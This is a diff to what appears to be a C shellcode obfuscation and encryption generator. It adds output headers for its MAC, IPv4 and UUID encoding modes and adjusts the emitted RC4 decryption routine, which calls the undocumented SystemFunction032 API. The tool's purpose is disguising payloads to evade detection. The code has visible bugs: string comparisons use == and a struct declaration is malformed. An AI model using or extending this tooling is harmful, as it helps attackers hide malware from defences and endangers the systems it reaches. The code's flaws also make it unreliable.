@@ -454,10 +454,10 @@ void EncryptRC4(SIZE_T file_size, unsigned char* payload, FILE* file)
     {
         fprintf(file, "0x%x, ", Key[i]);
     }
-    fprintf(file, "};\n");
+    fprintf(file, "};\n\n");
 
     // Write the decryption function
-    fprintf(file, "typedef struct USTRING\n{\n   DWORD\tLength;\n   DWORD\tMaximumLength;\n   PVOID\tBuffer;\n}\n\ntypedef NTSTATUS(NTAPI* findSystemFunction032)(struct USTRING* Data, struct USTRING* Key);\n\nvoid DecryptRC4(DWORD KeySize, DWORD dPayloadSize, PVOID pPayload, PVOID pKey)\n{\n\n   NTSTATUS STATUS = NULL;\n\t\n   USTRING Data =\n   {\n      .Length = dPayloadSize,\n      .MaximumLength = dPayloadSize,\n      .Buffer = pPayload\n   };\n\n   USTRING UKey =\n   {\n      .Length = KeySize,\n      .MaximumLength = KeySize,\n      .Buffer = pKey\n   };\n\n   findSystemFunction032 SystemFunction032 = (findSystemFunction032)GetProcAddress(LoadLibraryA(\"Advapi32\"), \"SystemFunction032\");   if ((STATUS = SystemFunction032(&Data, &UKey)) != 0x0)\n   {\n       printf(\"[!] SystemFunction032 FAILED With Error: 0x%0.8X \\n\", STATUS);\n   }\n\n}");
+    fprintf(file, "typedef struct USTRING\n{\n   DWORD\tLength;\n   DWORD\tMaximumLength;\n   PVOID\tBuffer;\n}\n\ntypedef NTSTATUS(NTAPI* findSystemFunction032)(struct USTRING* Data, struct USTRING* Key);\n\nvoid DecryptRC4(DWORD KeySize, DWORD dPayloadSize, PVOID pPayload, PVOID pKey)\n{\n\n   NTSTATUS STATUS = NULL;\n\t\n   USTRING Data =\n   {\n      .Length = dPayloadSize,\n      .MaximumLength = dPayloadSize,\n      .Buffer = pPayload\n   };\n\n   USTRING UKey =\n   {\n      .Length = KeySize,\n      .MaximumLength = KeySize,\n      .Buffer = pKey\n   };\n\n   findSystemFunction032 SystemFunction032 = (findSystemFunction032)GetProcAddress(LoadLibraryA(\"Advapi32\"), \"SystemFunction032\");   if ((STATUS = SystemFunction032(&Data, &UKey)) != 0x0)\n   {\n       printf(\"[!] SystemFunction032 FAILED With Error: 0x%0.8X \\n\", STATUS);\n   }\n\n}\n\n");
 
 }
 
@@ -665,17 +665,32 @@ int main(int argc, char* argv[]) {
 
     // Obfuscate
     if (obfuscationMethod == "MAC") 
-    {
+    {   
+        if (encryptionAlgorithm == "NONE") 
+        {
+            char WriteHeader[256] = "#include <Windows.h>\n#include <stdio.h>\n#include <Ip2string.h>\n#pragma comment(lib, \"Ntdll.lib\")\n\n#ifndef NT_SUCCESS\n#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)\n#endif\n\n";
+            fprintf(outputFile, "%s", WriteHeader);
+        }
         GenerateMACOutput(file_size, payload, outputFile);
     }
 
-    if (obfuscationMethod == "IPv4") 
-    {
+    if (obfuscationMethod == "IPv4")
+    {   
+        if (encryptionAlgorithm == "NONE")
+        {
+            char WriteHeader[256] = "#include <Windows.h>\n#include <stdio.h>\n#include <Ip2string.h>\n#pragma comment(lib, \"Ntdll.lib\")\n\n#ifndef NT_SUCCESS\n#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)\n#endif\n\n";
+            fprintf(outputFile, "%s", WriteHeader);
+        }
         GenerateIPv4Output(file_size, payload, outputFile);
     }
 
     if (obfuscationMethod == "UUID") 
     {
+        if (encryptionAlgorithm == "NONE")
+        {
+            char WriteHeader[256] = "#include <Windows.h>\n#include <stdio.h>\n#include <Ip2string.h>\n#pragma comment(lib, \"Ntdll.lib\")\n\n#ifndef NT_SUCCESS\n#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)\n#endif\n\n";
+            fprintf(outputFile, "%s", WriteHeader);
+        }
         GenerateUUIDOutput(file_size, payload, outputFile);
     }
 
